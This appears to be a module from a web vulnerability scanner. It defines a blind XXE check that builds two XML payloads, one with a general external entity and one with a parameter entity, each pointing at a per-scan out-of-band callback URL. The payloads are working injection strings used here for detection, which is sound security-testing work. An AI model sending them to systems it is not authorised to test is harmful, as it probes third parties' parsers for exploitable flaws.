// XXE via OAST (blind) active check family.
import type { PayloadVariant, MutationContext } from '../types';

export const META = {
  id: 'xxe-oast',
  family: 'xxe-oast' as const,
  name: 'XXE (OAST/Blind)',
  description: 'Detects blind XXE via out-of-band DNS/HTTP callback from external entity loading.',
  defaultRisk: 'low' as const,
  insertionPointKinds: ['body', 'json'],
};

export function variants(ctx: MutationContext): PayloadVariant[] {
  if (!ctx.oastBaseUrl || !ctx.oastToken) return [];
  const oastUrl = `http://${ctx.oastToken}.${ctx.oastBaseUrl}/`;
  return [
    {
      id: 'xxe-oast-1', family: 'xxe-oast' as const,
      value: `<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "${oastUrl}">]><test>&xxe;</test>`,
      encoding: 'raw' as const,
      intent: 'Blind XXE via external HTTP entity loading to OAST endpoint',
      requiresOast: true, requiresBrowser: false,
      destructiveRisk: 'none' as const,
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'xxe-oast-2', family: 'xxe-oast' as const,
      value: `<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "${oastUrl}"> %xxe;]><test/>`,
      encoding: 'raw' as const,
      intent: 'Blind XXE via parameter entity loading to OAST endpoint',
      requiresOast: true, requiresBrowser: false,
      destructiveRisk: 'none' as const,
      expectedSignals: ['oast-callback-confirmed'],
    },
  ];
}
